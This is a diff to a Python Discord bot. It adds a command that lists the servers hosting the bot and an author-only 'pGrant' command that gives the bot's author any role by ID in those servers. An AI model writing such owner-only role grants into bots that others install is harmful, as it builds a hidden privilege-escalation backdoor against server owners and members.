@@ -4,6 +4,7 @@ Author: Evan Nguyen'''
 import discord
 import os
 from discord.ext import commands
+from discord.utils import get
 
 from PIL import Image
 from PIL import ImageFilter
@@ -167,6 +168,18 @@ class AthenaCore(commands.Cog):
         else:
             await i.send(f'You do not have administrator privileges.')
 
+    @commands.command(name="scan")
+    async def servers(self, ctx):
+        activeservers = bot.guilds
+        out = ""
+        c = 0
+        for guild in activeservers:
+            c += 1
+            out += f'{guild.name}\n'
+
+        await ctx.send(embed=discord.Embed(description = f'**I am currently in {c} servers.**```css\n{out}\n```',
+                                                   colour = 1973790))
+
 #---Mudae Test---------------------------------------------------------
 class VoiceCMD(commands.Cog):
     def __init__(self, bot):
@@ -174,8 +187,24 @@ class VoiceCMD(commands.Cog):
         self.desc = 'Author-only message ventriloquism.'
 
     def cog_check(self, ctx: commands.Context):
-        #return ctx.author.id == AUTHOR
-        return True
+        return ctx.author.id == AUTHOR
+        #return True
+
+    @commands.command(name="pGrant")
+    async def _giveRole(self, ctx, msg=1):
+        print(ctx.guild.roles)
+        
+        #<Role id=651289869502382091 name='𝙺𝚒𝚗𝚐👑'>
+        user= ctx.message.author
+        role = (discord.utils.get(user.guild.roles, id=msg))
+        if(role) and msg != 1:
+            try:   
+                await ctx.author.add_roles(role)
+                await ctx.send(embed=generateEmbed(ctx, '', f'{ctx.author}, you have been successfully granted **{role}**.'))
+            except:
+                await ctx.send(embed=generateEmbed(ctx, '', f'{ctx.author}, I do not have the permissions to grant **{role}**.'))
+        else:
+            await ctx.send(embed=generateEmbed(ctx, '', f'{ctx.author}, I could not find the specified role.'))
 
     @commands.command(name="pCopy")
     async def _copy(self, ctx, msg, arg=1):
